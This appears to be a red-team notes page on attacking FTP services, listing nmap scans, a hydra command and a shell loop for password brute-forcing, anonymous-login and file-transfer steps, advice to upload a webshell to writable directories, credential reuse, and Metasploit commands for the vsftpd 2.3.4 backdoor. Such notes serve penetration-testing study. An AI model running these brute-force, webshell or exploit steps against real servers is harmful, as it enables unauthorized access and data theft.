---
title: 20,21 FTP
parent: Services
grand_parent: Red Team
nav_order: 21
has_children: true
---
# FTP
---

## Default Port
- 20
- 21

---

## Service Info

FTP is an unauthenticated or weakly authenticated file transfer service.
It often exposes misconfigurations such as:

- anonymous login enabled
- writable directories
- credential leakage in backup files
- internal web root exposure

---

## Common security issues

- Anonymous login enabled
- Writable directories exposed
- Credentials stored in backup/config files
- Old versions (e.g. vsftpd 2.3.4 RCE)
- Web root exposed via FTP upload

---

## 1. Initial Scan
#### nmap
```zsh
nmap -p 21 -sCV -A -oN port_sCVA <IP> --min-rate=5000
```
- -sCV
- -A 
- --min-rate=5000

```bash
nmap -p 21 --script ftp-* <IP>
```

```bash
nmap -p 21 --script vuln <IP>
```

```bash
nmap -p 21 --script ftp-anon,ftp-syst,ftp-banner <IP>
```
- ftp-anon
- ftp-syst
- ftp-banner


- service version
- exposed features

---

## 2. Enumeration
### brute-force
#### hydra
```zsh
hydra -l username -P /path/to/passwordlist.txt ftp://ftp.example.com
```
- **-l**: an user
- **-P**: password file

#### shell script
```zsh
for password in $(cat /path/to/passwordlist.txt); do
    echo "Trying password: $password"
    ftp -inv ftp.example.com << EOF
    user username $password
    bye
EOF
    if [ $? -eq 0 ]; then
        echo "Password found: $password"
        break
    fi
done
```
- /path/to/passwordlist.txt  Password list
- **ftp**: An FTP client command.
- **-i**: Disables interactive mode.
- **-n**: Disables automatic login.
- **-v**: Displays verbose output.

👉 Check:
- users / shares / endpoints
- anonymous access
- information disclosure

---

## 3. Access / File Operations
```bash
ftp <IP>
```

### anonymous login
```bash
anonymous
password
```
### user login
```zsh
kevin
kevins_password
```

### list
```zsh
ls
```

👉 Check:
* Public files
* Backup directories
* Config leaks
* Enable write folder

	👉 If writable:
	* upload webshell
	* overwrite web files
	* pivot to HTTP RCE

### download
```bash
get <FILE>
```

```
mget *
```

👉 Search for:
* credentials
* config files
* scripts
* backups

### upload
```zsh
put <FILE>
```

---

## 4. Credential Hunting

👉 Common findings:
* `.txt`, `.bak`, `.zip`
* `.config`, `.ini`
* web root files

👉 If creds found → try:
* [SSH](ssh.md)
* [WinRM](winrm.md)
* [MSSQL](mssql.md)

---
## 5.ExampleErorr
### 530 Login incorrect
Indicates that the credentials are incorrect.
- **Cause**: The username or password may be incorrect.
- **Solution**: Verify that you have the correct credentials and try logging in again.

### 550 Requested action not taken
Indicates that the requested action could not be performed.
- **Cause**: The file or directory may not exist, or you may lack the necessary access permissions.
- **Solution**: Verify that the file or directory exists and ensure that the necessary access permissions are set.

---

## 6. Exploitation
### Example:
#### vsftpd 2.3.4 backdoor
##### metasploit

```bash
searchsploit vsftpd
```

```zsh
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <IP>
run
```

